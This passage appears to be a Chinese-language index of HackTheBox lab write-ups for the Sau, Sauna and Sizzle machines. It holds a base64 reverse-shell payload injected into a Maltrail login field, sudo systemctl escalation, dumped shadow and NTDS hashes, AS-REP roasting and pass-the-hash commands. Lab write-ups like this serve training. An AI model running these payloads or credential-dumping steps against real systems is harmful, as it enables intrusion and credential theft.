0Request\\r\\nC\nSF:ontent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\\nSF:n\\r\\n400\\x20Bad\\x20Request\")%r(TerminalServerCookie,67,\"HTTP/1\\.1\\x2040\nSF:0\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\\nSF:nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\")%r(TLSSessionReq,67\nSF:,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x2\nSF:0charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\")%r\nSF:(Kerberos,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20te\nSF:xt/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x2\nSF:0Request\")%r(FourOhFourRequest,EA,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\nSF:\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nX-Content-Type-Optio\nSF:ns:\\x20nosniff\\r\\nDate:\\x20Tue,\\x2002\\x20Jan\\x202024\\x2001:36:46\\x20GMT\nSF:\\r\\nContent-Length:\\x2075\\r\\n\\r\\ninvalid\\x20basket\\x20name;\\x20the\\x20n\nSF:ame\\x20does\\x20not\\x20match\\x20pattern:\\x20\\^\\[\\\\w\\\\d\\\\-_\\\\\\.\\]{1,250}\\\nSF:$\\n\")%r(LPDString,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Typ\nSF:e:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x\nSF:20Bad\\x20Request\")%r(LDAPSearchReq,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Reque\nSF:st\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20c\nSF:lose\\r\\n\\r\\n400\\x20Bad\\x20Request\");\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 22/tcp)\nHOP RTT       ADDRESS\n1   259.59 ms 10.10.16.1\n2   185.75 ms 10.10.11.224\n</code></pre> \u53ea\u6709 22 \u548c 55555 \u53ef\u4ee5\u8bbf\u95ee</li> </ul>"}, {"location": "HackTheBox/Machines/Sau/#shell-as-user-puma", "title": "Shell as user - puma", "text": "<p>\u8bbf\u95ee 55555 \u7aef\u53e3  Request-Baskets\uff0c\u53ef\u4ee5\u5b9e\u73b0\u670d\u52a1\u7aef\u4ee3\u7406\u8bf7\u6c42\uff0c\u7ed3\u5408\u7aef\u53e3\u53d1\u73b0\uff0c\u8bbf\u95ee\u672c\u5730 80 \u7aef\u53e3\u3002  \u53d1\u73b0 Maltrail \u670d\u52a1v0.53  \u8be5\u7248\u672c\u5b58\u5728\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\uff0c\u6f0f\u6d1e\u70b9\u5728 login \u8def\u5f84\uff0cpost \u8bf7\u6c42\u5305\u4e2d\u7684 username \u53c2\u6570</p> <p>https://github.com/spookier/Maltrail-v0.53-Exploit/blob/main/exploit.py</p> <p>\u6784\u9020\u53cd\u5f39 shell <code>echo -e '/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.16.3/2233 0&gt;&amp;1\"' | base64</code> <pre><code>L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjMvMjIzMyAwPiYxIgo=\n</code></pre> \u4fee\u6539 Request-Baskets  \u53d1\u9001\u8bf7\u6c42 <pre><code>curl 'http://10.10.11.224:55555/70aohtj' --data 'username=;`echo+\"L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjMvMjIzMyAwPiYxJwo=\"+|+base64+-d+|+sh`'\n</code></pre> </p>"}, {"location": "HackTheBox/Machines/Sau/#shell-as-root", "title": "Shell as root", "text": "<p>\u67e5\u770b sudo \u6743\u9650 </p> <p>\u4f7f\u7528 <code>sudo /usr/bin/systemctl status trail.service</code> \u67e5\u770b\u670d\u52a1\u72b6\u6001\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7 <code>!/bin/bash</code> \u83b7\u5f97 shell </p>"}, {"location": "HackTheBox/Machines/Sau/#pass-hash", "title": "Pass Hash", "text": "<p><code>cat /etc/shadow</code> <pre><code>root:$6$4IguUssRBYl3/LvG$MfnFD1Y9saTrvw2OqA1VtqKxa7TsDt1kb2qsJw6inQ8GfmnqIrh32eqk9IMO4UR3fYG.TzbJeiFd7UOu1QlGR0:19461:0:99999:7:::\ndaemon:*:19367:0:99999:7:::\nbin:*:19367:0:99999:7:::\nsys:*:19367:0:99999:7:::\nsync:*:19367:0:99999:7:::\ngames:*:19367:0:99999:7:::\nman:*:19367:0:99999:7:::\nlp:*:19367:0:99999:7:::\nmail:*:19367:0:99999:7:::\nnews:*:19367:0:99999:7:::\nuucp:*:19367:0:99999:7:::\nproxy:*:19367:0:99999:7:::\nwww-data:*:19367:0:99999:7:::\nbackup:*:19367:0:99999:7:::\nlist:*:19367:0:99999:7:::\nirc:*:19367:0:99999:7:::\ngnats:*:19367:0:99999:7:::\nnobody:*:19367:0:99999:7:::\nsystemd-network:*:19367:0:99999:7:::\nsystemd-resolve:*:19367:0:99999:7:::\nsystemd-timesync:*:19367:0:99999:7:::\nmessagebus:*:19367:0:99999:7:::\nsyslog:*:19367:0:99999:7:::\n_apt:*:19367:0:99999:7:::\ntss:*:19367:0:99999:7:::\nuuidd:*:19367:0:99999:7:::\ntcpdump:*:19367:0:99999:7:::\nsshd:*:19367:0:99999:7:::\nlandscape:*:19367:0:99999:7:::\npollinate:*:19367:0:99999:7:::\nfwupd-refresh:*:19367:0:99999:7:::\nsystemd-coredump:!!:19461::::::\nlxd:!:19461::::::\npuma:$6$eB4LwfQg7IgQC38d$SktdHbU0gQAh0.BoRY36FHreH6xR073oHdRrk6hmvar4eZTnmkfxbUxsMBsaZMRm9XHYQF9hG4l5v6fefYdic/:19461:0:99999:7:::\n_laurel:!:19527::::::\n</code></pre></p>"}, {"location": "HackTheBox/Machines/Sauna/", "title": "Sauna", "text": ""}, {"location": "HackTheBox/Machines/Sauna/#recon-enum", "title": "Recon &amp; Enum", "text": "<p>export IP=10.10.10.175 - <code>nmap -sC -A -p- --min-rate 1000 -T4 $IP</code> <pre><code>PORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-title: Egotistical Bank :: Home\n|_http-server-header: Microsoft-IIS/10.0\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-11 10:43:20Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        .NET Message Framing\n49667/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49674/tcp open  msrpc         Microsoft Windows RPC\n49675/tcp open  msrpc         Microsoft Windows RPC\n49724/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2019 (88%)\nAggressive OS guesses: Microsoft Windows Server 2019 (88%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2024-01-11T10:45:36\n|_  start_date: N/A\n|_clock-skew: 6h59m37s\n</code></pre> - <code>crackmapexec</code> <pre><code>crackmapexec smb -i $IP -u guest -p '' --rid-brute 10000\ncrackmapexec smb -i $IP -u guest -p '' --shares\n---\nNull\n</code></pre> - <code>ldpasearch</code> <pre><code>ldapsearch -H \"ldap://$IP\" -x -s base namingcontexts\n---\n# extended LDIF\n#\n# LDAPv3\n# base &lt;&gt; (default) with scope baseObject\n# filter: (objectclass=*)\n# requesting: namingcontexts \n#\n\n#\ndn:\nnamingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL\nnamingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL\nnamingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL\nnamingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL\nnamingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL\n\n# search result\nsearch: 2\nresult: 0 Success\n\n# numResponses: 2\n# numEntries: 1\n\nldapsearch -H \"ldap://$IP\" -x -b \"DC=EGOTISTICAL-BANK,DC=LOCAL\" &gt; ldap_EGOTISTICAL-BANK_local.log\ncat ldap_EGOTISTICAL-BANK_local.log | grep 'userPrincipalName\\|OU=Service Accounts'\n</code></pre> - Get User <pre><code>impacket-GetADUsers EGOTISTICAL-BANK.local/ -dc-ip 10.10.10.175 \nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Querying 10.10.10.175 for information about domain.\nName                  Email                           PasswordLastSet      LastLogon           \n--------------------  ------------------------------  -------------------  -------------------\n</code></pre></p> <p>\u6ca1\u6709\u679a\u4e3e\u5230\u7528\u6237\uff0c\u518d\u770b\u770b Web \u670d\u52a1</p> <ul> <li>fuzz <pre><code>ffuf -u http://egotistical-bank.local/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt\n</code></pre>  \u65e0\u7ed3\u679c</li> <li>\u5c1d\u8bd5\u722c\u53d6 Web \u9875\u9762\u5185\u5bb9 <pre><code>cewl http://egotistical-bank.local/ -w web_cewl.list\n400 \u591a\u884c\uff0c\u6709\u70b9\u591a\n</code></pre></li> <li>\u627e\u5230 about.html \u9875\u9762\uff0c\u731c\u6d4b\u56e2\u961f\u6210\u5458\u59d3\u540d\u4f5c\u4e3a\u7528\u6237  \u7b80\u5355\u5904\u7406\u4e00\u4e0b </li> <li>\u679a\u4e3e\u7528\u6237\u540d\uff0c\u5c1d\u8bd5 ASREP-Roasting\uff0c\u5931\u8d25\uff0c\u5c1d\u8bd5\u5176\u4ed6\u7ec4\u5408 </li> <li>\u518d\u6b21\u5c1d\u8bd5 ASREP-Roasting <pre><code>impacket-GetNPUsers -no-pass -usersfile user.list -dc-ip 10.10.10.175 egotistical-bank.local/\n---\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:85bd1f636ebf06b2629b4e5cd0ed4be8$032fc5134db8eb03fe5304ed672b33c8c9f9e0c5543d36dc7d9a309ef1d4f1cf86c21301663c939d51ec9eb7d310291905df8b84b351e108b8390aa803cf20a2147baab18d659cb80a93c3618335dc2120207cb06008888036cfb791617fcf7e21b032b559122553e5fad8a7c75712a01e81f24d9da72a46be032266717a59b96bd9a2d9e5ddda94ed9a1ea5ac76ac79b144febfa8c6efcffd3bb3b5498c229128c632980142aabf2a103348059dab5daf48c08f21c67dcc03582da75c23720d8f1c7b36d72100eabb6aab5cfdc0b911f526ef2b9069bcdcc5c1809830d9b8d55fb03d884d75fc906efef0f8e8f48ed15d89b3e9d2a6c474808eab1d194f96cb\n</code></pre></li> </ul>"}, {"location": "HackTheBox/Machines/Sauna/#shell-as-user-fsmith", "title": "Shell as User - FSmith", "text": "<ul> <li>\u7206\u7834 Hash <code>hashcat -m 18200 [krb5asrep hash] rockyou.txt</code> <pre><code>$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:85bd1f636ebf06b2629b4e5cd0ed4be8$032fc5134db8eb03fe5304ed672b33c8c9f9e0c5543d36dc7d9a309ef1d4f1cf86c21301663c939d51ec9eb7d310291905df8b84b351e108b8390aa803cf20a2147baab18d659cb80a93c3618335dc2120207cb06008888036cfb791617fcf7e21b032b559122553e5fad8a7c75712a01e81f24d9da72a46be032266717a59b96bd9a2d9e5ddda94ed9a1ea5ac76ac79b144febfa8c6efcffd3bb3b5498c229128c632980142aabf2a103348059dab5daf48c08f21c67dcc03582da75c23720d8f1c7b36d72100eabb6aab5cfdc0b911f526ef2b9069bcdcc5c1809830d9b8d55fb03d884d75fc906efef0f8e8f48ed15d89b3e9d2a6c474808eab1d194f96cb:Thestrokes23\n\nFSmith@EGOTISTICAL-BANK.LOCAL / Thestrokes23\n</code></pre></li> <li><code>evil-winrm -i $IP -u 'FSmith' -p 'Thestrokes23'</code> </li> <li>\u57df\u63a7\u4e3a SAUNA.EGOTISTICAL-BANK.LOCAL\uff0c\u5f00\u59cb\u905b\u72d7 <pre><code>bloodhound-python -c all -d 'EGOTISTICAL-BANK.LOCAL' -u 'FSmith' -p 'Thestrokes23' -dc EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175\n</code></pre></li> <li>\u9996\u5148\u627e\u5230\u80fd\u591f AS-REP Roastable \u7684\u7528\u6237\uff0c\u6807\u8bb0\u4e3a owned</li> <li>\u627e\u5230\u9ad8\u4ef7\u503c\u8def\u5f84  \u53d1\u73b0\u4e00\u4e2a\u7528\u6237\u5177\u6709 DCSync \u6743\u9650</li> <li>\u8dd1\u4e00\u4e0b winpeas  \u53d1\u73b0 <code>svc_loanmanager/Moneymakestheworldgoround!</code> \u81ea\u52a8\u767b\u5f55\u7684\u5bc6\u7801\uff0c\u521a\u597d\u8fd9\u4e2a\u7528\u6237\u6709 DCSync \u6743\u9650\uff0c\u767b\u5f55\u540e\u4e0d\u5bf9\uff0c\u5728 Users \u76ee\u5f55\u53d1\u73b0\u7528\u6237\u540d\u4e3a <code>svc_loanmgr</code> </li> </ul>"}, {"location": "HackTheBox/Machines/Sauna/#shell-as-root", "title": "Shell as Root", "text": "<ul> <li><code>impacket-secretsdump EGOTISTICALBANK/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175</code> <pre><code>Impacket v0.11.0 - Copyright 2023 Fortra\n\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied \n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::\n...\n</code></pre></li> <li>PTH - Administrator <code>evil-winrm -i $IP -u administrator -H '823452073d75b9d1cf70ebdf86c7f98e'</code> </li> </ul>"}, {"location": "HackTheBox/Machines/Sauna/#dump-hash", "title": "Dump Hash", "text": "<p><code>impacket-secretsdump EGOTISTICALBANK/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175</code> <pre><code>Impacket v0.11.0 - Copyright 2023 Fortra\n\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied \n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::\nEGOTISTICAL-BANK.LOCAL\\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::\nEGOTISTICAL-BANK.LOCAL\\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::\nEGOTISTICAL-BANK.LOCAL\\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::\nSAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:6e6394a08ede375a3212e17608f33464:::\n[*] Kerberos keys grabbed\nAdministrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657\nAdministrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e\nAdministrator:des-cbc-md5:fb8f321c64cea87f\nkrbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24\nkrbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9\nkrbtgt:des-cbc-md5:c170d5dc3edfc1d9\nEGOTISTICAL-BANK.LOCAL\\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324\nEGOTISTICAL-BANK.LOCAL\\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9\nEGOTISTICAL-BANK.LOCAL\\HSmith:des-cbc-md5:1c73b99168d3f8c7\nEGOTISTICAL-BANK.LOCAL\\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2\nEGOTISTICAL-BANK.LOCAL\\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b\nEGOTISTICAL-BANK.LOCAL\\FSmith:des-cbc-md5:b50e02ab0d85f76b\nEGOTISTICAL-BANK.LOCAL\\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba\nEGOTISTICAL-BANK.LOCAL\\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c\nEGOTISTICAL-BANK.LOCAL\\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2\nSAUNA$:aes256-cts-hmac-sha1-96:2ccd8d6f46cc2408808b782884731ee45b8bdec96d08001012bf9df9c4db8a01\nSAUNA$:aes128-cts-hmac-sha1-96:d5cb46ccd859f2e428634530cc7b5eb7\nSAUNA$:des-cbc-md5:104c515b86739e08\n[*] Cleaning up...\n</code></pre></p>"}, {"location": "HackTheBox/Machines/Sizzle/", "title": "Sizzle", "text": ""}, {"location": "HackTheBox/Machines/Sizzle/#recon-enum", "title": "Recon &amp; Enum", "text": "<p>export IP=10.10.10.103</p>"}, {"location": "HackTheBox/Machines/Sizzle/#nmap", "title": "Nmap", "text": "<pre><code>PORT      STATE SERVICE       VERSION\n21/tcp    open  ftp           Microsoft ftpd\n| ftp-syst: \n|_  SYST: Windows_NT\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-title: Site doesn't have a title (text/html).\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)\n|_ssl-date: 2024-01-17T06:42:33+00:00; +1s from scanner time.\n| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL\n| Not valid before: 2024-01-16T16:26:10\n|_Not valid after:  2025-01-15T16:26:10\n443/tcp   open  ssl/http      Microsoft IIS httpd 10.0\n| ssl-cert: Subject: commonName=sizzle.htb.local\n| Not valid before: 2018-07-03T17:58:55\n|_Not valid after:  2020-07-02T17:58:55\n|_ssl-date: 2024-01-17T06:42:33+00:00; +1s from scanner time.\n| http-methods: \n|_  Potentially risky methods: TRACE\n| tls-alpn: \n|   h2\n|_  http/1.1\n|_http-title: Site doesn't have a title (text/html).\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)\n|_ssl-date: 2024-01-17T06:42:33+00:00; +1s from scanner time.\n| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL\n| Not valid before: 2024-01-16T16:26:10\n|_Not valid after:  2025-01-15T16:26:10\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)\n|_ssl-date: 2024-01-17T06:42:33+00:00; +1s from scanner time.\n| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL\n| Not valid before: 2024-01-16T16:26:10\n|_Not valid after:  2025-01-15T16:26:10\n3269/tcp  open  ssl/ldap\n|_ssl-date: 2024-01-17T06:42:33+00:00; +1s from scanner time.\n| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL\n| Not valid before: 2024-01-16T16:26:10\n|_Not valid after:  2025-01-15T16:26:10\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL\n| Not valid before: 2024-01-16T16:26:10\n|_Not valid after:  2025-01-15T16:26:10\n|_ssl-date: 2024-01-17T06:42:33+00:00; +1s from scanner time.\n|_http-title: Not Found\n| tls-alpn: \n|   h2\n|_  http/1.1\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  msrpc         Microsoft Windows RPC\n49682/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49683/tcp open  msrpc         Microsoft Windows RPC\n49684/tcp open  msrpc         Microsoft Windows RPC\n49691/tcp open  msrpc         Microsoft Windows RPC\n49692/tcp open  msrpc         Microsoft Windows RPC\n49715/tcp open  msrpc         Microsoft Windows RPC\n65280/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2016 (88%)\nOS CPE: cpe:/o:microsoft:windows_server_2016\nAggressive OS guesses: Microsoft Windows Server 2016 (88%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2024-01-17T06:41:57\n|_  start_date: 2024-01-16T08:35:56\n</code></pre>"}, {"location": "HackTheBox/Machines/Sizzle/#ldapsearch", "title": "LdapSearch", "text": "<pre><code>ldapsearch -x -H \"ldap://$IP\" -s base namingContexts\n---\ndn:\nnamingContexts: DC=HTB,DC=LOCAL\nnamingContexts: CN=Configuration,DC=HTB,DC=LOCAL\nnamingContexts: CN=Schema,CN=Configuration,DC=HTB,DC=LOCAL\nnamingContexts: DC=DomainDnsZones,DC=HTB,DC=LOCAL\nnamingContexts: DC=ForestDnsZones,DC=HTB,DC=LOCAL\n\nldapsearch -x -H \"ldap://$IP\" -b \"DC=HTB,DC=LOCAL\"\n</code></pre>"}, {"location": "HackTheBox/Machines/Sizzle/#crackmapexec", "title": "CrackMapExec", "text": "<ul> <li><code>crackmapexec smb $IP -u guest -p '' --shares</code></li> </ul> <pre><code>Department Shares\n</code></pre> <ul> <li><code>crackmapexec smb $IP -u guest -p '' --rid-brute 10000</code></li> </ul> <pre><code>Administrator\nGuest\nkrbtgt\nSIZZLE$\nDnsAdmins\nDnsUpdateProxy\namanda\nmrlky\nsizzler\n</code></pre>"}, {"location": "HackTheBox/Machines/Sizzle/#web", "title": "Web", "text": "<p>\u53ea\u6709\u4e00\u4e2a\u56fe\u7247</p> <p></p> <ul> <li>\u76ee\u5f55\u679a\u4e3e</li> </ul> <p></p> <p>\u6ca1\u53d1\u73b0\u4ec0\u4e48\u6709\u7528\u7684\u4e1c\u897f</p>"}, {"location": "HackTheBox/Machines/Sizzle/#shell-as-user-amanda", "title": "Shell as User - amanda", "text": ""}, {"location": "HackTheBox/Machines/Sizzle/#_1", "title": "\u83b7\u53d6\u51ed\u636e", "text": "<p>\u518d\u6b21\u770b\u5230 Samba \u670d\u52a1\uff0c\u4ece\u540d\u5b57\u6765\u770b <code>Department Shares</code> \u662f\u4e2a\u90e8\u95e8\u5171\u4eab\u6587\u4ef6\u5939\uff0c\u5f88\u6709\u53ef\u80fd\u5404\u4e2a\u5458\u5de5\u4f1a\u5bf9\u6587\u4ef6\u8fdb\u884c\u64cd\u4f5c\uff0c\u56e0\u6b64\u5c1d\u8bd5\u9493\u9c7c\u3002</p> <ul> <li> <p>\u6302\u8f7d Samba Share \u5230\u672c\u5730 <code>mount -t cifs \"//10.10.10.103/Department Shares\" /mnt/smb</code></p> </li> <li> <p>\u6587\u4ef6\u7ed3\u6784</p> </li> </ul> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/mnt/smb]\n\u2514\u2500# tree\n.\n\u251c\u2500\u2500 Accounting\n\u251c\u2500\u2500 Audit\n\u251c\u2500\u2500 Banking\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 Offshore\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 Clients\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 Data\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 Dev\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 Plans\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 Sites\n\u251c\u2500\u2500 CEO_protected\n\u251c\u2500\u2500 Devops\n\u251c\u2500\u2500 Finance\n\u251c\u2500\u2500 HR\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 Benefits\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 Corporate Events\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 New Hire Documents\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 Payroll\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 Policies\n\u251c\u2500\u2500 IT\n\u251c\u2500\u2500 Infosec\n\u251c\u2500\u2500 Infrastructure\n\u251c\u2500\u2500 Legal\n\u251c\u2500\u2500 M&amp;A\n\u251c\u2500\u2500 Marketing\n\u251c\u2500\u2500 R&amp;D\n\u251c\u2500\u2500 Sales\n\u251c\u2500\u2500 Security\n\u251c\u2500\u2500 Tax\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 2010\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 2011\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 2012\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 2013\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 2014\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 2015\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 2016\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 2017\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 2018\n\u251c\u2500\u2500 Users\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 Public\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 users\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 amanda\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 amanda_adm\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 bill\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 bob\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 chris\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 henry\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 